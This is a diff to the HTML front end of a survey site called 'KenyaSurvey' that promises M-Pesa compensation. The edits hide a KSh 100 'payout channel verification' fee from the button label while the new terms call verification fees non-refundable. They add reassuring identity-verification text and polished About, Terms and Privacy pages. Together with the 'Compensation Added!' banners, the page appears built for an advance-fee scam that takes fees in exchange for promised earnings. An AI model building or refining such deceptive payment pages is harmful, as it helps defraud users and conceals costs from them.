@@ -20,9 +20,6 @@
   <div class="earn-label">Compensation Added!</div>
 </div>
 
-<!-- LIVE WITHDRAW NOTIFICATIONS -->
-<div class="live-withdraw-container" id="live-withdraw-container"></div>
-
 <!-- ══════════════════════════════════════════
      LANDING SCREEN
 ══════════════════════════════════════════ -->
@@ -765,18 +762,6 @@
       <div class="page-title" id="dash-greeting">Good day!</div>
       <div class="page-sub">Track your research participation activity and compensation.</div>
 
-      <!-- WITHDRAW HERO BANNER -->
-      <div class="withdraw-hero-banner" id="withdraw-hero-banner">
-        <div class="withdraw-hero-content">
-          <div class="withdraw-hero-icon"><i class="fas fa-paper-plane"></i></div>
-          <div>
-            <h3>Withdraw Your Earnings</h3>
-            <p>Your compensation is ready. Request payment to M-Pesa instantly after verification.</p>
-          </div>
-        </div>
-        <button class="btn-withdraw-hero" onclick="showPanel('withdraw')">Withdraw Now</button>
-      </div>
-
       <div class="start-survey-hero">
         <div class="start-survey-left">
           <div class="start-survey-icon-wrap"><i class="fas fa-clipboard-list"></i></div>
@@ -880,7 +865,7 @@
       </div>
     </div>
 
-    <!-- PARTICIPANT COMPENSATION (WITHDRAW) -->
+    <!-- PARTICIPANT COMPENSATION -->
     <div class="page-panel withdraw-box" id="panel-withdraw">
       <div class="page-title">Participant Compensation</div>
       <div class="page-sub">Request payment of your accumulated compensation to M-Pesa. Compensation becomes available after survey validation.</div>
@@ -906,13 +891,12 @@
         </div>
       </div>
 
-      <!-- WD LOCKED -->
       <div id="wd-locked" class="hidden">
         <div class="locked-msg">
           <i class="fas fa-shield-alt"></i>
           <div>
             <strong style="color:var(--gold);display:block;margin-bottom:6px;">Payout Channel Verification</strong>
-            <p>To verify ownership of your registered mobile number and activate M-Pesa payment services, a one-time verification process is required.</p>
+            <p>To verify ownership of your registered mobile number and activate M-Pesa payment services, a one-time verification process is required. This confirms your identity before your first payment request is processed.</p>
           </div>
         </div>
         <div class="field-group" style="margin-bottom:16px">
@@ -927,49 +911,57 @@
         <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;" id="btn-activate" onclick="doActivate()">
           <i class="fas fa-shield-alt"></i> Verify Account
         </button>
+        <p class="auth-note" style="margin-top:12px">One-time verification required to activate payment services. This process confirms your registered mobile number.</p>
       </div>
 
-      <!-- WD FORCE -->
       <div id="wd-force" class="hidden">
         <div style="background:rgba(0,166,81,0.08);border:1px solid rgba(0,166,81,0.25);border-radius:var(--radius);padding:16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px;">
           <i class="fas fa-check-circle" style="color:var(--green);margin-top:2px"></i>
           <div>
             <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">Identity Verified</div>
-            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your account identity has been verified. Complete payout channel verification to enable payments.</div>
+            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your account identity has been verified. To complete the M-Pesa payout channel setup and enable payment processing, a payout channel verification step is required.</div>
+          </div>
+        </div>
+        <div class="locked-msg" style="margin-bottom:16px;">
+          <i class="fas fa-info-circle" style="color:#3b82f6"></i>
+          <div>
+            <strong style="color:#60a5fa;display:block;margin-bottom:4px;">Payout Channel Verification</strong>
+            <p>This step registers your M-Pesa number as a verified payout channel. This is required to ensure successful delivery of compensation to your mobile wallet.</p>
           </div>
         </div>
         <div class="alert error" id="fv-error"></div>
         <div class="alert success" id="fv-success"></div>
         <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;background:linear-gradient(135deg,#3b82f6,#1d4ed8);" id="btn-force-verify" onclick="doForceVerify()">
-          <i class="fas fa-link" style="margin-right:8px"></i> Verify Payout Channel (KSh 100)
+          <i class="fas fa-link" style="margin-right:8px"></i> Verify Payout Channel
         </button>
       </div>
 
-      <!-- WD UNLOCKED -->
       <div id="wd-unlocked" class="hidden">
-        <div class="wd-slider-section">
-          <label class="field-label">Withdrawal Amount (KSh)</label>
-          <div class="amount-display" id="wd-amount-display">150</div>
-          <input type="range" class="slider-input" id="wd-slider" min="150" max="5000" step="10" value="150" oninput="updateSlider()">
-          <div class="slider-labels">
-            <span>KSh 150</span>
-            <span>KSh 5,000</span>
+        <div class="field-group" style="margin-bottom:16px">
+          <label class="field-label">M-Pesa Phone Number</label>
+          <div class="field-wrap">
+            <i class="fas fa-mobile-alt"></i>
+            <input class="field-input" type="tel" id="wd-phone" placeholder="07XX XXX XXX" />
           </div>
         </div>
-
-        <div class="fee-info">
-          <span>Transaction Fee (2%)</span>
-          <span id="fee-display">KSh 3.00</span>
+        <div class="field-group" style="margin-bottom:8px">
+          <label class="field-label">Amount to Request (KSh)</label>
+          <div class="amount-display" id="wd-amount-display">150</div>
+          <input type="range" class="slider-input" id="wd-slider" min="150" max="1000" step="10" value="150" oninput="updateSlider()" />
+          <div style="display:flex;justify-content:space-between;font-size:0.75rem;color:var(--text3);margin-top:4px">
+            <span>KSh 150</span><span>KSh 1,000</span>
+          </div>
         </div>
-
         <div class="alert error" id="wd-error"></div>
-        <button class="btn-primary btn-withdraw-main" id="btn-withdraw-main" onclick="attemptWithdraw()">
-          <i class="fas fa-paper-plane"></i> Withdraw Now
+        <div class="alert success" id="wd-success"></div>
+        <button class="btn-primary" id="btn-withdraw" onclick="doWithdraw()" style="margin-top:12px">
+          <i class="fas fa-paper-plane"></i> Submit Payment Request
         </button>
+        <p class="auth-note" style="margin-top:10px">Payment requests are processed to your registered M-Pesa number. Processing may take up to 24 hours.</p>
       </div>
     </div>
 
-    <!-- TRANSACTIONS -->
+    <!-- COMPENSATION HISTORY -->
     <div class="page-panel" id="panel-transactions">
       <div class="page-title">Compensation History</div>
       <div class="page-sub">View your research participation compensation and payment request history.</div>
@@ -982,30 +974,112 @@
     </div>
 
   </main>
-</div>
+</div><!-- /app-screen -->
+
 
 <!-- ══════════════════════════════════════════
      MODALS
 ══════════════════════════════════════════ -->
 <div class="modal-overlay" id="modal-overlay" onclick="closeModal()"></div>
 
-<!-- Withdraw Notification -->
-<div class="modal-overlay" id="withdraw-notification-overlay" onclick="closeWithdrawNotification()"></div>
-<div class="modal" id="withdraw-notification-modal">
+<!-- About -->
+<div class="modal" id="modal-about">
   <div class="modal-header">
-    <h3><i class="fas fa-info-circle"></i> Withdrawal Submitted</h3>
-    <button onclick="closeWithdrawNotification()"><i class="fas fa-times"></i></button>
+    <h3><i class="fas fa-info-circle"></i> About KenyaSurvey</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
   </div>
   <div class="modal-body">
-    <p>Your withdrawal has been submitted but your phone number is not registered in payment accounts records. You need to verify it then receive your rewards instantly to your M-Pesa.</p>
-    <button class="btn-primary" onclick="startVerificationFromNotification()" style="width:100%;margin-top:12px;">
-      Verify Now
-    </button>
+    <p>KenyaSurvey is a research participation platform that connects eligible participants with survey and data collection projects across Kenya.</p>
+    <p>We help organisations and researchers gather opinions, demographic data, and survey responses from verified Kenyan participants. Participants who complete eligible surveys may receive compensation via M-Pesa.</p>
+    <h4>Our Mission</h4>
+    <p>To make research participation accessible to all Kenyans while providing fair compensation for participants' time and input.</p>
+    <h4>Our Vision</h4>
+    <p>A Kenya where every citizen can contribute meaningfully to research that shapes policy, business and community outcomes.</p>
+    <h4>Research Ethics</h4>
+    <p>All participant data is handled confidentially. Survey responses are aggregated and anonymised before being shared with research clients. Participants may request deletion of their data at any time.</p>
+    <h4>Compensation Disclaimer</h4>
+    <p>Compensation is not guaranteed. Eligibility depends on project availability, participant demographics, survey completion, and compliance with platform requirements.</p>
+    <div class="modal-contact-info">
+      <p><i class="fas fa-envelope"></i> support@kenyasurvey.com</p>
+      <p><i class="fas fa-globe"></i> premium-surveys-kenya.vercel.app</p>
+    </div>
   </div>
 </div>
 
-<!-- Other modals (about, terms, privacy, contact) from your original HTML remain the same -->
-<!-- ... (full original modals included in complete file) ... -->
+<!-- Terms -->
+<div class="modal" id="modal-terms">
+  <div class="modal-header">
+    <h3><i class="fas fa-file-contract"></i> Terms of Service</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <h4>1. Eligibility</h4>
+    <p>You must be 18 years or older and a resident of Kenya to participate. Account registration requires a valid Kenyan mobile number. Multiple accounts are not permitted.</p>
+    <h4>2. Survey Participation</h4>
+    <p>Survey availability and eligibility are determined by individual project requirements. Not all registered participants will qualify for all surveys. Compensation is only awarded for surveys you are eligible for and complete according to project requirements.</p>
+    <h4>3. Compensation</h4>
+    <p>Compensation amounts are set per survey project. KenyaSurvey does not guarantee any specific income. Compensation is paid via M-Pesa to your registered number after verification requirements are met.</p>
+    <h4>4. Account Verification</h4>
+    <p>Before payment services are activated, participants must complete an account verification process. This confirms your registered mobile number and activates the M-Pesa payout channel. Verification fees are non-refundable.</p>
+    <h4>5. Survey Disqualification</h4>
+    <p>Participants who do not meet a survey's eligibility requirements may be disqualified from that survey. Disqualified participants do not receive compensation for that survey.</p>
+    <h4>6. Prohibited Conduct</h4>
+    <p>Creating multiple accounts, submitting false information, or attempting to manipulate survey responses may result in account suspension and forfeiture of compensation.</p>
+    <h4>7. Account Suspension</h4>
+    <p>KenyaSurvey reserves the right to suspend or terminate accounts that violate these terms. Suspended accounts forfeit any unpaid compensation balances.</p>
+    <h4>8. Fraud</h4>
+    <p>Any attempt to fraudulently obtain compensation will result in immediate account termination and may be reported to relevant authorities.</p>
+  </div>
+</div>
+
+<!-- Privacy -->
+<div class="modal" id="modal-privacy">
+  <div class="modal-header">
+    <h3><i class="fas fa-user-shield"></i> Privacy Policy</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <h4>Information We Collect</h4>
+    <p>We collect your phone number, PIN (hashed), demographic information (name, county, occupation, education), and survey responses.</p>
+    <h4>How We Use Your Information</h4>
+    <p>Your information is used to match you to relevant surveys, process compensation payments, and maintain platform security. Demographic data may be shared in aggregate, anonymised form with research clients.</p>
+    <h4>Data Principles</h4>
+    <p>We follow privacy-first principles. We collect only the data necessary for platform operation and do not sell your personal data to third parties.</p>
+    <h4>M-Pesa Payments</h4>
+    <p>Your phone number is used to process M-Pesa payments. We do not store your M-Pesa PIN.</p>
+    <h4>Data Security</h4>
+    <p>All passwords and PINs are hashed using secure algorithms. Connections are encrypted via HTTPS.</p>
+    <h4>Your Rights</h4>
+    <p>You may request access to, correction of, or deletion of your account and personal data by contacting support@kenyasurvey.com. We will process requests within 14 business days.</p>
+  </div>
+</div>
+
+<!-- Contact -->
+<div class="modal" id="modal-contact">
+  <div class="modal-header">
+    <h3><i class="fas fa-envelope"></i> Contact Us</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <p>For support, questions, or concerns about your account, please reach out to our team.</p>
+    <div class="modal-contact-info">
+      <p><i class="fas fa-envelope"></i> <strong>Support Email:</strong> support@kenyasurvey.com</p>
+      <p><i class="fas fa-clock"></i> <strong>Business Hours:</strong> Monday – Friday, 8am – 6pm EAT</p>
+      <p><i class="fas fa-reply"></i> <strong>Response Time:</strong> Within 24–48 hours</p>
+    </div>
+    <div class="contact-topics">
+      <p><strong>Common support topics:</strong></p>
+      <ul>
+        <li>Account verification issues</li>
+        <li>Payment request status</li>
+        <li>Survey eligibility questions</li>
+        <li>Profile update requests</li>
+        <li>Account deletion requests</li>
+        <li>Data privacy enquiries</li>
+      </ul>
+    </div>
+  </div>
+</div>
 
 <script src="app.js"></script>
 </body>
